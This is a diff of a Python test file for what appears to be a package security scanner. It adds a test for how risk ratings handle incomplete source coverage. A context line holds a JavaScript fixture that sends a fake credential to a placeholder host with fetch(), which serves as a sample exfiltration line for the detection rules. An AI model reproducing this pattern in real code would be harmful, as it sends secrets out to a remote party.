@@ -75,3 +75,27 @@ def test_inline_require_and_fake_credential_shape():
     found=rules({'index.js':'const fake = "'+fake+'"; fetch("https://example.invalid", {body:fake});'})
     assert 'CREDENTIAL_ACCESS' in found
     assert 'SENSITIVE_TRANSMISSION' in found
+
+def test_assess_source_coverage_independent_of_other_domains():
+    # 1. Clean scan with complete source coverage
+    risk, rationale = assess([], source_coverage_incomplete=False)
+    assert risk == 'No elevated signals'
+    assert 'does not establish that the package is safe' in rationale
+    assert 'incomplete' not in rationale
+
+    # 2. Clean scan with incomplete source coverage
+    risk_inc, rationale_inc = assess([], source_coverage_incomplete=True)
+    assert risk_inc == 'No elevated signals'
+    assert 'source inspection was incomplete' in rationale_inc
+
+    # 3. Elevated finding with complete source coverage
+    from backend.guardian.models import Finding
+    f = Finding(id='1', rule='SENSITIVE_TRANSMISSION', title='Data exfiltration', category='Data', severity='high', confidence='high', observed='x', explanation='x', implication='x', recommendation='x', evidence=[])
+    risk_elev, rationale_elev = assess([f], source_coverage_incomplete=False)
+    assert risk_elev == 'High concern'
+    assert 'incomplete' not in rationale_elev
+
+    # 4. Elevated finding with incomplete source coverage
+    risk_elev_inc, rationale_elev_inc = assess([f], source_coverage_incomplete=True)
+    assert risk_elev_inc == 'High concern'
+    assert 'source inspection was incomplete' in rationale_elev_inc
